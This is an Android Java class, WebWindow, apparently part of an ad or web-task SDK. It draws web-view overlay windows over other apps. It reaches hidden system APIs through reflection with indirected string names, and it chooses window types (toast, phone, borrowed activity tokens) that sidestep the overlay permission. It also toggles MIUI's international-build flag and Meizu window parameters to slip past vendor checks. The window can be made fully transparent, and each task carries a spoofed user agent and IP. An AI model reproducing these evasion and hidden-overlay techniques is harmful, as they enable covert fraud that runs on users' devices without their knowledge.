package com.rbt.vrde.core.web.component;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.View;
import android.view.WindowManager;

import com.rbt.vrde.utils.MySystemProperties;
import com.rbt.vrde.utils.StringUtils;
import com.young.myaddemo.utils.SystemUtil;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

/**
 * Created by Roy on 2018/6/29.
 */

public abstract class WebWindow {

    private final static String TAG = "WebWindow";

    public static final boolean mTransparent = false;

    public Context mContext;

    private View mView;
    private Object mWindowMgr;
    private Object mParams;
    /*private WindowManager mWindowMgr;
    private WindowManager.LayoutParams mParams;*/

    private boolean isShow = false;

    public int sWidth;
    public int sHeight;

    public int mTaskId;
    public String mUserAgent;
    public String mIpv4;
    public String mWebUrl;

    public WebWindow(Context context) {
        mContext = context;
        mView = createView();

        /*if (null == mToast) {
            mToast = new Toast(context.getApplicationContext());
        }*/

        createWindow();
    }

    private Object getWindowMgr() {
        try {
            Method getService = Context.class.getDeclaredMethod(com.rbt.vrde.core.res.R.webpage.WebWindow._getSystemService, String.class);
            getService.setAccessible(true);
            Object obj = getService.invoke(mContext, com.rbt.vrde.core.res.R.webpage.WebWindow._window);
            return obj;
        } catch (Exception e) {
//            MLog.e(TAG, "---getWindowMgr Err:" + e.getMessage(), e);
        }
        return null;
    }

    private Object getWindowParams() {
        try {
            Object obj = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._android_view_WindowManager$LayoutParams).getDeclaredConstructor().newInstance();
            return obj;
        } catch (Exception e) {
//            MLog.e(TAG, "---getWindowParams Err:" + e.getMessage(), e);
        }
        return null;
    }

    private void setWindowParamsFiled(String field, Object value) {
        try {
            Field f = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._android_view_WindowManager$LayoutParams).getDeclaredField(field);
            f.setAccessible(true);
            f.set(mParams, value);
        } catch (Exception e) {
//            MLog.e(TAG, "---setWindowParamsFiled Err:" + e.getMessage(), e);
        }
    }

    private void addView(View view) {
        try {
            Class lpClz = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._android_view_ViewGroup$LayoutParams);
            Method addView = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._android_view_WindowManagerImpl).getDeclaredMethod(com.rbt.vrde.core.res.R.webpage.WebWindow._addView, View.class, lpClz);
            addView.setAccessible(true);
            addView.invoke(mWindowMgr, view, mParams);
        } catch (Throwable e) {
//            MLog.e(TAG, "---addView Err:" + e.getMessage(), e);
        }
    }

    public void removeView(View view) {
        try {
            Method removeView = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._android_view_WindowManagerImpl).getDeclaredMethod(com.rbt.vrde.core.res.R.webpage.WebWindow._removeView, View.class);
            removeView.setAccessible(true);
            removeView.invoke(mWindowMgr, view);
        } catch (Exception e) {
//            MLog.e(TAG, "---removeView Err:" + e.getMessage(), e);
        }
    }

    private Object getWindowToken (Activity act) {
        //IBinder windowToken = act.getWindow().getDecorView().getWindowToken();
        try {
            Method getWindow = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._android_app_Activity).getDeclaredMethod(com.rbt.vrde.core.res.R.webpage.WebWindow._getWindow);
            getWindow.setAccessible(true);
            Object window = getWindow.invoke(act);
            Method getDecorView = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._android_view_Window).getDeclaredMethod(com.rbt.vrde.core.res.R.webpage.WebWindow._getDecorView);
            getDecorView.setAccessible(true);
            Object view = getDecorView.invoke(window);
            Method getWindowToken = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._android_view_View).getDeclaredMethod(com.rbt.vrde.core.res.R.webpage.WebWindow._getWindowToken);
            getWindowToken.setAccessible(true);
            Object obj = getWindowToken.invoke(view);
            return obj;
        } catch (Exception e) {
//            MLog.e(TAG, "---getWindowToken Err:" + e.getMessage(), e);
        }
        return null;
    }

    private void createWindow() {
        mWindowMgr = getWindowMgr();
        mParams = getWindowParams();
        /*mWindowMgr = (WindowManager) mContext.getSystemService("window");
        mParams = new WindowManager.LayoutParams();*/
        /*setWindowParamsFiled("height", -1);
        setWindowParamsFiled("width", -1);*/
        /*mParams.height = WindowManager.LayoutParams.MATCH_PARENT;
        mParams.width = WindowManager.LayoutParams.MATCH_PARENT;*/
        if(mTransparent) {
            setWindowParamsFiled(com.rbt.vrde.core.res.R.webpage.WebWindow._format, -2);
            setWindowParamsFiled(com.rbt.vrde.core.res.R.webpage.WebWindow._alpha, 0f);
            /*mParams.format = PixelFormat.TRANSPARENT;
            mParams.alpha = 0f;*/
        }
        setWindowParamsFiled(com.rbt.vrde.core.res.R.webpage.WebWindow._flags, 24);
        if(!mTransparent) {
            setWindowParamsFiled(com.rbt.vrde.core.res.R.webpage.WebWindow._flags, WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE);
        }

        //mParams.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;

        int osvc = SystemUtil.getSDKInt();
        //SDK>=26的情况
        if (osvc >= Build.VERSION_CODES.O) {
            setWindowParamsFiled(com.rbt.vrde.core.res.R.webpage.WebWindow._type, 2037);
            //mParams.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY - 1;
        }
        //sdk==7.1.1或者小米MIUI9并且SDK<26目前只能使用应用内弹窗，依赖于activity
        else if (osvc == Build.VERSION_CODES.N_MR1 || (checkMiUIRom() && osvc < Build.VERSION_CODES.O)) {

            Activity act = getCurrentActivity();
//            MLog.i(TAG, "---current activity:" + act);
            if(act != null) {
                setWindowParamsFiled(com.rbt.vrde.core.res.R.webpage.WebWindow._type, 1003);
                //mParams.type = WindowManager.LayoutParams.TYPE_APPLICATION_ATTACHED_DIALOG;
                //IBinder windowToken = act.getWindow().getDecorView().getWindowToken();
                Object obj = getWindowToken(act);
                setWindowParamsFiled(com.rbt.vrde.core.res.R.webpage.WebWindow._token, obj);
                //mParams.token = windowToken;
            }
        }
        // sdk<19的情况
        else if (osvc < Build.VERSION_CODES.KITKAT) {
            setWindowParamsFiled(com.rbt.vrde.core.res.R.webpage.WebWindow._type, 2002);
            //mParams.type = WindowManager.LayoutParams.TYPE_PHONE;
            // 其余
        } else {
            setWindowParamsFiled(com.rbt.vrde.core.res.R.webpage.WebWindow._type, 2005);
            //mParams.type = WindowManager.LayoutParams.TYPE_TOAST;
        }
    }

    public boolean isAlive() {
        return isShow;
    }

    public void show(int taskId, String ua, String ipv4) {
        if (isShow) {
            return;
        }
        if (mView != null && mWindowMgr != null) {
            beforeAddToWindow();
            addView(mView);
            //mWindowMgr.addView(mView, mParams);
            afterAddToWindow();
        }

        mTaskId = taskId;
        mUserAgent = ua;
        mIpv4 = ipv4;

        WindowManager wm = (WindowManager) mContext.getSystemService(com.rbt.vrde.core.res.R.webpage.TaskActivity._window);
        DisplayMetrics dm = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(dm);
        sWidth = dm.widthPixels;
        sHeight = dm.heightPixels;

        main();

        isShow = true;
    }

    public void show(String url, String ua) {
        mWebUrl = url;
        show(0, ua, null);
    }

    public void hide() {
        if (!isShow) {
            return;
        }

        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {

                closeAll();

                if (mWindowMgr == null)
                    return;

                if (isShow) {
                    removeView(mView);
                    //mWindowMgr.removeView(mView);
                }

                isShow = false;
                mView = null;
                mParams = null;
                mWindowMgr = null;
//                MLog.e(TAG, "---ActivityUtils checkNextTask---");

            }
        });
    }

    private Activity getCurrentActivity () {
        try {
            Class activityThreadClass = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._android_app_ActivityThread);
            Object activityThread = activityThreadClass.getMethod(com.rbt.vrde.core.res.R.webpage.WebWindow._currentActivityThread).invoke(null);
            Field activitiesField = activityThreadClass.getDeclaredField(com.rbt.vrde.core.res.R.webpage.WebWindow._mActivities);
            activitiesField.setAccessible(true);
            Map activities = (Map) activitiesField.get(activityThread);
            for (Object activityRecord : activities.values()) {
                Class activityRecordClass = activityRecord.getClass();
                Field pausedField = activityRecordClass.getDeclaredField(com.rbt.vrde.core.res.R.webpage.WebWindow._paused);
                pausedField.setAccessible(true);
                if (!pausedField.getBoolean(activityRecord)) {
                    Field activityField = activityRecordClass.getDeclaredField(com.rbt.vrde.core.res.R.webpage.WebWindow._activity);
                    activityField.setAccessible(true);
                    Activity activity = (Activity) activityField.get(activityRecord);
                    return activity;
                }
            }
        } catch (Exception e) {
//            MLog.e(TAG, "---getCurrentActivity Err:" + e.getMessage(), e);
        }
        return null;
    }

    private boolean checkMiUIRom() {
        String vn = MySystemProperties.get(com.rbt.vrde.core.res.R.webpage.WebWindow._ro_miui_ui_version_name);
//        MLog.i(TAG, "-----Miui Rom:[" + vn + "]");
        if(StringUtils.isNotBlank(vn) && com.rbt.vrde.core.res.R.webpage.WebWindow._V9.equals(vn)) {
            return true;
        }
        return false;
    }

    private void beforeAddToWindow() {
        if (checkIsMiUIRom()) {//针对小米MIUI8的情况
            setMiUIParams(true);
        } else if (checkIsMeiZuRom()) {//针对魅族适配的情况，目前没有测试机，不能测试到底是否能显示
            setMeiZuParams();
        }
    }

    private void afterAddToWindow() {
        //把之前修改的参数改回来
        if (checkIsMiUIRom()) {
            setMiUIParams(false);
        }

    }

    //修改参数，针对小米MIUI8的适配
    private void setMiUIParams(boolean flag) {
        try {
            Class BuildForMi = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._miui_os_Build);
            Field isInternational = BuildForMi.getDeclaredField(com.rbt.vrde.core.res.R.webpage.WebWindow._IS_INTERNATIONAL_BUILD);
            isInternational.setAccessible(true);
            isInternational.setBoolean(null, flag);
        } catch (Exception e) {
//            MLog.e(TAG, "---setMiUIParams:" + e.getMessage(), e);
        }
    }

    //魅族的适配
    private void setMeiZuParams() {
        try {
            Class MeizuParamsClass = Class.forName(com.rbt.vrde.core.res.R.webpage.WebWindow._android_view_MeizuLayoutParams);
            Field flagField = MeizuParamsClass.getDeclaredField(com.rbt.vrde.core.res.R.webpage.WebWindow._flags);
            flagField.setAccessible(true);
            Object MeizuParams = MeizuParamsClass.newInstance();
            flagField.setInt(MeizuParams, 0x40);

            setWindowParamsFiled(com.rbt.vrde.core.res.R.webpage.WebWindow._meizuParams, MeizuParams);
            /*Field mzParamsField = params.getClass().getField(com.ib.mob.core.res.R.webpage.WebWindow._meizuParams);
            mzParamsField.set(params, MeizuParams);*/
        } catch (Exception e) {
//            MLog.e(TAG, "---setMeiZuParams:" + e.getMessage(), e);
        }
    }

    private boolean checkIsMiUIRom() {
        return StringUtils.isNotBlank(MySystemProperties.get(com.rbt.vrde.core.res.R.webpage.WebWindow._ro_miui_ui_version_name));
    }

    private boolean checkIsMeiZuRom() {
        String flag = MySystemProperties.get(com.rbt.vrde.core.res.R.webpage.WebWindow._ro_build_display_id);
        if (StringUtils.isBlank(flag)) {
            return false;
        } else if (flag.toLowerCase().contains(com.rbt.vrde.core.res.R.webpage.WebWindow._flyme)) {
            return true;
        } else {
            return false;
        }
    }

    public abstract View createView();

    public abstract void main();

    public abstract void closeAll();
}
